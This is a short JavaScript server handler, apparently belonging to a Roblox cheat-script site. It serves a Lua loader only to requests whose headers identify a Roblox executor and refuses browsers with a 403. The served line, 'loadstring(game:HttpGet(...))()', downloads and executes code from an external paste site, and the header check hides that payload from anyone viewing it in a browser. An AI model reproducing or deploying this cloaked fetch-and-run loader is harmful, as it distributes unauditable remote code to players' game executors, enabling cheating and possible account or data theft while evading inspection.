export default function handler(req, res) {
    const userAgent = req.headers['user-agent'] || '';
    
    // Check if the request is coming from a common Roblox Executor
    // Most executors identify as "RobloxShare" or have specific headers like "Syn-Fingerprint"
    const isExecutor = userAgent.includes('Roblox') || 
                       req.headers['x-executor'] || 
                       req.headers['syn-fingerprint'];

    if (!isExecutor) {
        // If it's a browser, redirect them to the home page or show an error
        return res.status(403).send("Access Denied: Please use a supported executor.");
    }

    // THE ACTUAL LUA SCRIPT (Polarized V7)
    const luaScript = `
    loadstring(game:HttpGet("https://pastefy.app/02YmDjW1/raw"))()

    `;

    res.setHeader('Content-Type', 'text/plain');
    return res.status(200).send(luaScript);
}
